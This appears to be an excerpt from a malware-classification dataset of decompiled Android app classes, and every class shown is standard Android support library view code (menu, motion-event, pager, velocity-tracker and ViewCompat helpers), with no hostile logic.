"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\MenuItemCompatIcs.code","class MenuItemCompatIcs { interface SupportActionExpandProxy {     boolean onMenuItemActionCollapse(    MenuItem menuItem);     boolean onMenuItemActionExpand(    MenuItem menuItem);   }   MenuItemCompatIcs(){   }   public static boolean expandActionView(  MenuItem item){     return item.expandActionView();   }   public static boolean collapseActionView(  MenuItem item){     return item.collapseActionView();   }   public static boolean isActionViewExpanded(  MenuItem item){     return item.isActionViewExpanded();   }   public static MenuItem setOnActionExpandListener(  MenuItem item,  SupportActionExpandProxy listener){     return item.setOnActionExpandListener(new OnActionExpandListenerWrapper(listener));   } static class OnActionExpandListenerWrapper implements MenuItem.OnActionExpandListener {     private SupportActionExpandProxy mWrapped;     public OnActionExpandListenerWrapper(    SupportActionExpandProxy wrapped){       this.mWrapped=wrapped;     }     @Override public boolean onMenuItemActionExpand(    MenuItem item){       return this.mWrapped.onMenuItemActionExpand(item);     }     @Override public boolean onMenuItemActionCollapse(    MenuItem item){       return this.mWrapped.onMenuItemActionCollapse(item);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\MenuVersionImpl.code","interface MenuVersionImpl {   boolean collapseActionView(  MenuItem menuItem);   boolean expandActionView(  MenuItem menuItem);   View getActionView(  MenuItem menuItem);   boolean isActionViewExpanded(  MenuItem menuItem);   MenuItem setActionView(  MenuItem menuItem,  int i);   MenuItem setActionView(  MenuItem menuItem,  View view);   MenuItem setOnActionExpandListener(  MenuItem menuItem,  OnActionExpandListener onActionExpandListener);   void setShowAsAction(  MenuItem menuItem,  int i); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\MotionEventCompat.code","public class MotionEventCompat {   public static final int ACTION_HOVER_ENTER=9;   public static final int ACTION_HOVER_EXIT=10;   public static final int ACTION_HOVER_MOVE=7;   public static final int ACTION_MASK=255;   public static final int ACTION_POINTER_DOWN=5;   public static final int ACTION_POINTER_INDEX_MASK=65280;   public static final int ACTION_POINTER_INDEX_SHIFT=8;   public static final int ACTION_POINTER_UP=6;   public static final int ACTION_SCROLL=8;   static final MotionEventVersionImpl IMPL; interface MotionEventVersionImpl {     int findPointerIndex(    MotionEvent motionEvent,    int i);     int getPointerCount(    MotionEvent motionEvent);     int getPointerId(    MotionEvent motionEvent,    int i);     float getX(    MotionEvent motionEvent,    int i);     float getY(    MotionEvent motionEvent,    int i);   } static class BaseMotionEventVersionImpl implements MotionEventVersionImpl {     BaseMotionEventVersionImpl(){     }     @Override public int findPointerIndex(    MotionEvent event,    int pointerId){       return pointerId == 0 ? 0 : -1;     }     @Override public int getPointerId(    MotionEvent event,    int pointerIndex){       if (pointerIndex == 0) {         return 0;       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public float getX(    MotionEvent event,    int pointerIndex){       if (pointerIndex == 0) {         return event.getX();       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public float getY(    MotionEvent event,    int pointerIndex){       if (pointerIndex == 0) {         return event.getY();       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public int getPointerCount(    MotionEvent event){       return 1;     }   } static class EclairMotionEventVersionImpl implements MotionEventVersionImpl {     EclairMotionEventVersionImpl(){     }     @Override public int findPointerIndex(    MotionEvent event,    int pointerId){       return MotionEventCompatEclair.findPointerIndex(event,pointerId);     }     @Override public int getPointerId(    MotionEvent event,    int pointerIndex){       return MotionEventCompatEclair.getPointerId(event,pointerIndex);     }     @Override public float getX(    MotionEvent event,    int pointerIndex){       return MotionEventCompatEclair.getX(event,pointerIndex);     }     @Override public float getY(    MotionEvent event,    int pointerIndex){       return MotionEventCompatEclair.getY(event,pointerIndex);     }     @Override public int getPointerCount(    MotionEvent event){       return MotionEventCompatEclair.getPointerCount(event);     }   } static {     if (Build.VERSION.SDK_INT >= 5) {       IMPL=new EclairMotionEventVersionImpl();     }  else {       IMPL=new BaseMotionEventVersionImpl();     }   }   public static int getActionMasked(  MotionEvent event){     return event.getAction() & ACTION_MASK;   }   public static int getActionIndex(  MotionEvent event){     return (event.getAction() & ACTION_POINTER_INDEX_MASK) >> 8;   }   public static int findPointerIndex(  MotionEvent event,  int pointerId){     return IMPL.findPointerIndex(event,pointerId);   }   public static int getPointerId(  MotionEvent event,  int pointerIndex){     return IMPL.getPointerId(event,pointerIndex);   }   public static float getX(  MotionEvent event,  int pointerIndex){     return IMPL.getX(event,pointerIndex);   }   public static float getY(  MotionEvent event,  int pointerIndex){     return IMPL.getY(event,pointerIndex);   }   public static int getPointerCount(  MotionEvent event){     return IMPL.getPointerCount(event);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\MotionEventCompatEclair.code","class MotionEventCompatEclair {   MotionEventCompatEclair(){   }   public static int findPointerIndex(  MotionEvent event,  int pointerId){     return event.findPointerIndex(pointerId);   }   public static int getPointerId(  MotionEvent event,  int pointerIndex){     return event.getPointerId(pointerIndex);   }   public static float getX(  MotionEvent event,  int pointerIndex){     return event.getX(pointerIndex);   }   public static float getY(  MotionEvent event,  int pointerIndex){     return event.getY(pointerIndex);   }   public static int getPointerCount(  MotionEvent event){     return event.getPointerCount();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\MotionEventVersionImpl.code","interface MotionEventVersionImpl {   int findPointerIndex(  MotionEvent motionEvent,  int i);   int getPointerCount(  MotionEvent motionEvent);   int getPointerId(  MotionEvent motionEvent,  int i);   float getX(  MotionEvent motionEvent,  int i);   float getY(  MotionEvent motionEvent,  int i); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\MyAccessibilityDelegate.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7e814ac7"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\OnActionExpandListener.code","public interface OnActionExpandListener {   boolean onMenuItemActionCollapse(  MenuItem menuItem);   boolean onMenuItemActionExpand(  MenuItem menuItem); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\OnActionExpandListenerWrapper.code","static class OnActionExpandListenerWrapper implements MenuItem.OnActionExpandListener {   private SupportActionExpandProxy mWrapped;   public OnActionExpandListenerWrapper(  SupportActionExpandProxy wrapped){     this.mWrapped=wrapped;   }   @Override public boolean onMenuItemActionExpand(  MenuItem item){     return this.mWrapped.onMenuItemActionExpand(item);   }   @Override public boolean onMenuItemActionCollapse(  MenuItem item){     return this.mWrapped.onMenuItemActionCollapse(item);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\OnAdapterChangeListener.code","public interface OnAdapterChangeListener {   void onAdapterChanged(  PagerAdapter pagerAdapter,  PagerAdapter pagerAdapter2); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\OnPageChangeListener.code","public interface OnPageChangeListener {   void onPageScrollStateChanged(  int i);   void onPageScrolled(  int i,  float f,  int i2);   void onPageSelected(  int i); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\PageListener.code","public class PageListener extends DataSetObserver implements ViewPager.OnAdapterChangeListener, ViewPager.OnPageChangeListener {   private int mScrollState;   private PageListener(){   }   @Override public void onPageScrolled(  int position,  float positionOffset,  int positionOffsetPixels){     if (positionOffset > 0.5f) {       position++;     }     PagerTitleStrip.this.updateTextPositions(position,positionOffset,false);   }   @Override public void onPageSelected(  int position){     if (this.mScrollState == 0) {       PagerTitleStrip.this.updateText(PagerTitleStrip.this.mPager.getCurrentItem(),PagerTitleStrip.this.mPager.getAdapter());       float offset=PagerTitleStrip.this.mLastKnownPositionOffset >= 0.0f ? PagerTitleStrip.this.mLastKnownPositionOffset : 0.0f;       PagerTitleStrip.this.updateTextPositions(PagerTitleStrip.this.mPager.getCurrentItem(),offset,true);     }   }   @Override public void onPageScrollStateChanged(  int state){     this.mScrollState=state;   }   @Override public void onAdapterChanged(  PagerAdapter oldAdapter,  PagerAdapter newAdapter){     PagerTitleStrip.this.updateAdapter(oldAdapter,newAdapter);   }   @Override public void onChanged(){     PagerTitleStrip.this.updateText(PagerTitleStrip.this.mPager.getCurrentItem(),PagerTitleStrip.this.mPager.getAdapter());     float offset=PagerTitleStrip.this.mLastKnownPositionOffset >= 0.0f ? PagerTitleStrip.this.mLastKnownPositionOffset : 0.0f;     PagerTitleStrip.this.updateTextPositions(PagerTitleStrip.this.mPager.getCurrentItem(),offset,true);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\PagerAdapter.code","public abstract class PagerAdapter {   public static final int POSITION_NONE=-2;   public static final int POSITION_UNCHANGED=-1;   private DataSetObservable mObservable=new DataSetObservable();   public abstract int getCount();   public abstract boolean isViewFromObject(  View view,  Object obj);   public void startUpdate(  ViewGroup container){     startUpdate((View)container);   }   public Object instantiateItem(  ViewGroup container,  int position){     return instantiateItem((View)container,position);   }   public void destroyItem(  ViewGroup container,  int position,  Object object){     destroyItem((View)container,position,object);   }   public void setPrimaryItem(  ViewGroup container,  int position,  Object object){     setPrimaryItem((View)container,position,object);   }   public void finishUpdate(  ViewGroup container){     finishUpdate((View)container);   }   public void startUpdate(  View container){   }   public Object instantiateItem(  View container,  int position){     throw new UnsupportedOperationException(""Required method instantiateItem was not overridden"");   }   public void destroyItem(  View container,  int position,  Object object){     throw new UnsupportedOperationException(""Required method destroyItem was not overridden"");   }   public void setPrimaryItem(  View container,  int position,  Object object){   }   public void finishUpdate(  View container){   }   public Parcelable saveState(){     return null;   }   public void restoreState(  Parcelable state,  ClassLoader loader){   }   public int getItemPosition(  Object object){     return -1;   }   public void notifyDataSetChanged(){     this.mObservable.notifyChanged();   }   public void registerDataSetObserver(  DataSetObserver observer){     this.mObservable.registerObserver(observer);   }   public void unregisterDataSetObserver(  DataSetObserver observer){     this.mObservable.unregisterObserver(observer);   }   public CharSequence getPageTitle(  int position){     return null;   }   public float getPageWidth(  int position){     return 1.0f;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\PagerObserver.code","private class PagerObserver extends DataSetObserver {   private PagerObserver(){   }   @Override public void onChanged(){     ViewPager.this.dataSetChanged();   }   @Override public void onInvalidated(){     ViewPager.this.dataSetChanged();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\PagerTabStrip.code","public class PagerTabStrip extends PagerTitleStrip {   private static final int FULL_UNDERLINE_HEIGHT=1;   private static final int INDICATOR_HEIGHT=3;   private static final int MIN_PADDING_BOTTOM=6;   private static final int MIN_STRIP_HEIGHT=32;   private static final int MIN_TEXT_SPACING=64;   private static final int TAB_PADDING=16;   private static final int TAB_SPACING=32;   private static final String TAG=""PagerTabStrip"";   private boolean mDrawFullUnderline;   private boolean mDrawFullUnderlineSet;   private int mFullUnderlineHeight;   private boolean mIgnoreTap;   private int mIndicatorColor;   private int mIndicatorHeight;   private float mInitialMotionX;   private float mInitialMotionY;   private int mMinPaddingBottom;   private int mMinStripHeight;   private int mMinTextSpacing;   private int mTabAlpha;   private int mTabPadding;   private final Paint mTabPaint;   private final Rect mTempRect;   private int mTouchSlop;   public PagerTabStrip(  Context context){     this(context,null);   }   public PagerTabStrip(  Context context,  AttributeSet attrs){     super(context,attrs);     this.mTabPaint=new Paint();     this.mTempRect=new Rect();     this.mTabAlpha=MotionEventCompat.ACTION_MASK;     this.mDrawFullUnderline=false;     this.mDrawFullUnderlineSet=false;     this.mIndicatorColor=this.mTextColor;     this.mTabPaint.setColor(this.mIndicatorColor);     float density=context.getResources().getDisplayMetrics().density;     this.mIndicatorHeight=(int)((3.0f * density) + 0.5f);     this.mMinPaddingBottom=(int)((6.0f * density) + 0.5f);     this.mMinTextSpacing=(int)(64.0f * density);     this.mTabPadding=(int)((16.0f * density) + 0.5f);     this.mFullUnderlineHeight=(int)((1.0f * density) + 0.5f);     this.mMinStripHeight=(int)((32.0f * density) + 0.5f);     this.mTouchSlop=ViewConfiguration.get(context).getScaledTouchSlop();     setPadding(getPaddingLeft(),getPaddingTop(),getPaddingRight(),getPaddingBottom());     setTextSpacing(getTextSpacing());     setWillNotDraw(false);     this.mPrevText.setFocusable(true);     this.mPrevText.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         PagerTabStrip.this.mPager.setCurrentItem(PagerTabStrip.this.mPager.getCurrentItem() - 1);       }     } );     this.mNextText.setFocusable(true);     this.mNextText.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         PagerTabStrip.this.mPager.setCurrentItem(PagerTabStrip.this.mPager.getCurrentItem() + 1);       }     } );     if (getBackground() == null) {       this.mDrawFullUnderline=true;     }   }   public void setTabIndicatorColor(  int color){     this.mIndicatorColor=color;     this.mTabPaint.setColor(this.mIndicatorColor);     invalidate();   }   public void setTabIndicatorColorResource(  int resId){     setTabIndicatorColor(getContext().getResources().getColor(resId));   }   public int getTabIndicatorColor(){     return this.mIndicatorColor;   }   @Override public void setPadding(  int left,  int top,  int right,  int bottom){     if (bottom < this.mMinPaddingBottom) {       bottom=this.mMinPaddingBottom;     }     super.setPadding(left,top,right,bottom);   }   @Override public void setTextSpacing(  int textSpacing){     if (textSpacing < this.mMinTextSpacing) {       textSpacing=this.mMinTextSpacing;     }     super.setTextSpacing(textSpacing);   }   @Override public void setBackgroundDrawable(  Drawable d){     super.setBackgroundDrawable(d);     if (!this.mDrawFullUnderlineSet) {       this.mDrawFullUnderline=d == null;     }   }   @Override public void setBackgroundColor(  int color){     super.setBackgroundColor(color);     if (!this.mDrawFullUnderlineSet) {       this.mDrawFullUnderline=((-16777216) & color) == 0;     }   }   @Override public void setBackgroundResource(  int resId){     super.setBackgroundResource(resId);     if (!this.mDrawFullUnderlineSet) {       this.mDrawFullUnderline=resId == 0;     }   }   public void setDrawFullUnderline(  boolean drawFull){     this.mDrawFullUnderline=drawFull;     this.mDrawFullUnderlineSet=true;     invalidate();   }   public boolean getDrawFullUnderline(){     return this.mDrawFullUnderline;   }   @Override public int getMinHeight(){     return Math.max(super.getMinHeight(),this.mMinStripHeight);   }   @Override public boolean onTouchEvent(  MotionEvent ev){     int action=ev.getAction();     if (action != 0 && this.mIgnoreTap) {       return false;     }     float x=ev.getX();     float y=ev.getY(); switch (action) { case 0:       this.mInitialMotionX=x;     this.mInitialMotionY=y;   this.mIgnoreTap=false; break; case 1: if (x >= this.mCurrText.getLeft() - this.mTabPadding) { if (x > this.mCurrText.getRight() + this.mTabPadding) {   this.mPager.setCurrentItem(this.mPager.getCurrentItem() + 1);   break; } }  else { this.mPager.setCurrentItem(this.mPager.getCurrentItem() - 1); break; } break; case 2: if (Math.abs(x - this.mInitialMotionX) > this.mTouchSlop || Math.abs(y - this.mInitialMotionY) > this.mTouchSlop) { this.mIgnoreTap=true; break; } break; } return true; } @Override protected void onDraw(Canvas canvas){ super.onDraw(canvas); int height=getHeight(); int left=this.mCurrText.getLeft() - this.mTabPadding; int right=this.mCurrText.getRight() + this.mTabPadding; int top=height - this.mIndicatorHeight; this.mTabPaint.setColor((this.mTabAlpha << 24) | (this.mIndicatorColor & ViewCompat.MEASURED_SIZE_MASK)); canvas.drawRect(left,top,right,height,this.mTabPaint); if (this.mDrawFullUnderline) { this.mTabPaint.setColor((-16777216) | (this.mIndicatorColor & ViewCompat.MEASURED_SIZE_MASK)); canvas.drawRect(getPaddingLeft(),height - this.mFullUnderlineHeight,getWidth() - getPaddingRight(),height,this.mTabPaint); } } @Override public void updateTextPositions(int position,float positionOffset,boolean force){ Rect r=this.mTempRect; int bottom=getHeight(); int left=this.mCurrText.getLeft() - this.mTabPadding; int right=this.mCurrText.getRight() + this.mTabPadding; int top=bottom - this.mIndicatorHeight; r.set(left,top,right,bottom); super.updateTextPositions(position,positionOffset,force); this.mTabAlpha=(int)(Math.abs(positionOffset - 0.5f) * 2.0f * 255.0f); int left2=this.mCurrText.getLeft() - this.mTabPadding; int right2=this.mCurrText.getRight() + this.mTabPadding; r.union(left2,top,right2,bottom); invalidate(r); } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\PagerTitleStrip.code","!org.eclipse.jdt.core.dom.TypeDeclaration@11ca89fc"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\PagerTitleStripIcs.code","class PagerTitleStripIcs {   PagerTitleStripIcs(){   }   public static void setSingleLineAllCaps(  TextView text){     text.setTransformationMethod(new SingleLineAllCapsTransform(text.getContext()));   } private static class SingleLineAllCapsTransform extends SingleLineTransformationMethod {     private static final String TAG=""SingleLineAllCapsTransform"";     private Locale mLocale;     public SingleLineAllCapsTransform(    Context context){       this.mLocale=context.getResources().getConfiguration().locale;     }     @Override public CharSequence getTransformation(    CharSequence source,    View view){       CharSequence source2=super.getTransformation(source,view);       if (source2 != null) {         return source2.toString().toUpperCase(this.mLocale);       }       return null;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\PagerTitleStripImpl.code","public interface PagerTitleStripImpl {   void setSingleLineAllCaps(  TextView textView); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\PagerTitleStripImplBase.code","static class PagerTitleStripImplBase implements PagerTitleStripImpl {   PagerTitleStripImplBase(){   }   @Override public void setSingleLineAllCaps(  TextView text){     text.setSingleLine();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\PagerTitleStripImplIcs.code","static class PagerTitleStripImplIcs implements PagerTitleStripImpl {   PagerTitleStripImplIcs(){   }   @Override public void setSingleLineAllCaps(  TextView text){     PagerTitleStripIcs.setSingleLineAllCaps(text);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\PageTransformer.code","public interface PageTransformer {   void transformPage(  View view,  float f); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\SavedState.code","public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=ParcelableCompat.newCreator(new ParcelableCompatCreatorCallbacks<SavedState>(){     @Override public SavedState createFromParcel(    Parcel in,    ClassLoader loader){       return new SavedState(in,loader);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } );   Parcelable adapterState;   ClassLoader loader;   int position;   public SavedState(  Parcelable superState){     super(superState);   }   @Override public void writeToParcel(  Parcel out,  int flags){     super.writeToParcel(out,flags);     out.writeInt(this.position);     out.writeParcelable(this.adapterState,flags);   }   public String toString(){     return ""FragmentPager.SavedState{"" + Integer.toHexString(System.identityHashCode(this)) + "" position=""+ this.position+ ""}"";   }   SavedState(  Parcel in,  ClassLoader loader){     super(in);     loader=loader == null ? getClass().getClassLoader() : loader;     this.position=in.readInt();     this.adapterState=in.readParcelable(loader);     this.loader=loader;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ScaleGestureDetectorCompat.code","public class ScaleGestureDetectorCompat {   static final ScaleGestureDetectorImpl IMPL; interface ScaleGestureDetectorImpl {     boolean isQuickScaleEnabled(    Object obj);     void setQuickScaleEnabled(    Object obj,    boolean z);   } private static class BaseScaleGestureDetectorImpl implements ScaleGestureDetectorImpl {     private BaseScaleGestureDetectorImpl(){     }     @Override public void setQuickScaleEnabled(    Object o,    boolean enabled){     }     @Override public boolean isQuickScaleEnabled(    Object o){       return false;     }   } private static class ScaleGestureDetectorCompatKitKatImpl implements ScaleGestureDetectorImpl {     private ScaleGestureDetectorCompatKitKatImpl(){     }     @Override public void setQuickScaleEnabled(    Object o,    boolean enabled){       ScaleGestureDetectorCompatKitKat.setQuickScaleEnabled(o,enabled);     }     @Override public boolean isQuickScaleEnabled(    Object o){       return ScaleGestureDetectorCompatKitKat.isQuickScaleEnabled(o);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       IMPL=new ScaleGestureDetectorCompatKitKatImpl();     }  else {       IMPL=new BaseScaleGestureDetectorImpl();     }   }   private ScaleGestureDetectorCompat(){   }   public static void setQuickScaleEnabled(  Object scaleGestureDetector,  boolean enabled){     IMPL.setQuickScaleEnabled(scaleGestureDetector,enabled);   }   public static boolean isQuickScaleEnabled(  Object scaleGestureDetector){     return IMPL.isQuickScaleEnabled(scaleGestureDetector);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ScaleGestureDetectorCompatKitKat.code","class ScaleGestureDetectorCompatKitKat {   private ScaleGestureDetectorCompatKitKat(){   }   public static void setQuickScaleEnabled(  Object scaleGestureDetector,  boolean enabled){     ((ScaleGestureDetector)scaleGestureDetector).setQuickScaleEnabled(enabled);   }   public static boolean isQuickScaleEnabled(  Object scaleGestureDetector){     return ((ScaleGestureDetector)scaleGestureDetector).isQuickScaleEnabled();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ScaleGestureDetectorCompatKitKatImpl.code","private static class ScaleGestureDetectorCompatKitKatImpl implements ScaleGestureDetectorImpl {   private ScaleGestureDetectorCompatKitKatImpl(){   }   @Override public void setQuickScaleEnabled(  Object o,  boolean enabled){     ScaleGestureDetectorCompatKitKat.setQuickScaleEnabled(o,enabled);   }   @Override public boolean isQuickScaleEnabled(  Object o){     return ScaleGestureDetectorCompatKitKat.isQuickScaleEnabled(o);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ScaleGestureDetectorImpl.code","interface ScaleGestureDetectorImpl {   boolean isQuickScaleEnabled(  Object obj);   void setQuickScaleEnabled(  Object obj,  boolean z); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\SimpleOnPageChangeListener.code","public static class SimpleOnPageChangeListener implements OnPageChangeListener {   @Override public void onPageScrolled(  int position,  float positionOffset,  int positionOffsetPixels){   }   @Override public void onPageSelected(  int position){   }   @Override public void onPageScrollStateChanged(  int state){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\SingleLineAllCapsTransform.code","private static class SingleLineAllCapsTransform extends SingleLineTransformationMethod {   private static final String TAG=""SingleLineAllCapsTransform"";   private Locale mLocale;   public SingleLineAllCapsTransform(  Context context){     this.mLocale=context.getResources().getConfiguration().locale;   }   @Override public CharSequence getTransformation(  CharSequence source,  View view){     CharSequence source2=super.getTransformation(source,view);     if (source2 != null) {       return source2.toString().toUpperCase(this.mLocale);     }     return null;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\SubUiVisibilityListener.code","public interface SubUiVisibilityListener {   void onSubUiVisibilityChanged(  boolean z); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\SupportActionExpandProxy.code","interface SupportActionExpandProxy {   boolean onMenuItemActionCollapse(  MenuItem menuItem);   boolean onMenuItemActionExpand(  MenuItem menuItem); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\VelocityTrackerCompat.code","public class VelocityTrackerCompat {   static final VelocityTrackerVersionImpl IMPL; interface VelocityTrackerVersionImpl {     float getXVelocity(    VelocityTracker velocityTracker,    int i);     float getYVelocity(    VelocityTracker velocityTracker,    int i);   } static class BaseVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {     BaseVelocityTrackerVersionImpl(){     }     @Override public float getXVelocity(    VelocityTracker tracker,    int pointerId){       return tracker.getXVelocity();     }     @Override public float getYVelocity(    VelocityTracker tracker,    int pointerId){       return tracker.getYVelocity();     }   } static class HoneycombVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {     HoneycombVelocityTrackerVersionImpl(){     }     @Override public float getXVelocity(    VelocityTracker tracker,    int pointerId){       return VelocityTrackerCompatHoneycomb.getXVelocity(tracker,pointerId);     }     @Override public float getYVelocity(    VelocityTracker tracker,    int pointerId){       return VelocityTrackerCompatHoneycomb.getYVelocity(tracker,pointerId);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new HoneycombVelocityTrackerVersionImpl();     }  else {       IMPL=new BaseVelocityTrackerVersionImpl();     }   }   public static float getXVelocity(  VelocityTracker tracker,  int pointerId){     return IMPL.getXVelocity(tracker,pointerId);   }   public static float getYVelocity(  VelocityTracker tracker,  int pointerId){     return IMPL.getYVelocity(tracker,pointerId);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\VelocityTrackerCompatHoneycomb.code","class VelocityTrackerCompatHoneycomb {   VelocityTrackerCompatHoneycomb(){   }   public static float getXVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getXVelocity(pointerId);   }   public static float getYVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getYVelocity(pointerId);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\VelocityTrackerVersionImpl.code","interface VelocityTrackerVersionImpl {   float getXVelocity(  VelocityTracker velocityTracker,  int i);   float getYVelocity(  VelocityTracker velocityTracker,  int i); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewCompat.code","public class ViewCompat {   public static final int ACCESSIBILITY_LIVE_REGION_ASSERTIVE=2;   public static final int ACCESSIBILITY_LIVE_REGION_NONE=0;   public static final int ACCESSIBILITY_LIVE_REGION_POLITE=1;   private static final long FAKE_FRAME_TIME=10;   static final ViewCompatImpl IMPL;   public static final int IMPORTANT_FOR_ACCESSIBILITY_AUTO=0;   public static final int IMPORTANT_FOR_ACCESSIBILITY_NO=2;   public static final int IMPORTANT_FOR_ACCESSIBILITY_NO_HIDE_DESCENDANTS=4;   public static final int IMPORTANT_FOR_ACCESSIBILITY_YES=1;   public static final int LAYER_TYPE_HARDWARE=2;   public static final int LAYER_TYPE_NONE=0;   public static final int LAYER_TYPE_SOFTWARE=1;   public static final int LAYOUT_DIRECTION_INHERIT=2;   public static final int LAYOUT_DIRECTION_LOCALE=3;   public static final int LAYOUT_DIRECTION_LTR=0;   public static final int LAYOUT_DIRECTION_RTL=1;   public static final int MEASURED_HEIGHT_STATE_SHIFT=16;   public static final int MEASURED_SIZE_MASK=16777215;   public static final int MEASURED_STATE_MASK=-16777216;   public static final int MEASURED_STATE_TOO_SMALL=16777216;   public static final int OVER_SCROLL_ALWAYS=0;   public static final int OVER_SCROLL_IF_CONTENT_SCROLLS=1;   public static final int OVER_SCROLL_NEVER=2; interface ViewCompatImpl {     boolean canScrollHorizontally(    View view,    int i);     boolean canScrollVertically(    View view,    int i);     int getAccessibilityLiveRegion(    View view);     AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    View view);     float getAlpha(    View view);     int getImportantForAccessibility(    View view);     int getLabelFor(    View view);     int getLayerType(    View view);     int getLayoutDirection(    View view);     int getMeasuredHeightAndState(    View view);     int getMeasuredState(    View view);     int getMeasuredWidthAndState(    View view);     int getOverScrollMode(    View view);     ViewParent getParentForAccessibility(    View view);     boolean hasTransientState(    View view);     boolean isOpaque(    View view);     void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    View view,    AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);     void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     boolean performAccessibilityAction(    View view,    int i,    Bundle bundle);     void postInvalidateOnAnimation(    View view);     void postInvalidateOnAnimation(    View view,    int i,    int i2,    int i3,    int i4);     void postOnAnimation(    View view,    Runnable runnable);     void postOnAnimationDelayed(    View view,    Runnable runnable,    long j);     int resolveSizeAndState(    int i,    int i2,    int i3);     void setAccessibilityDelegate(    View view,    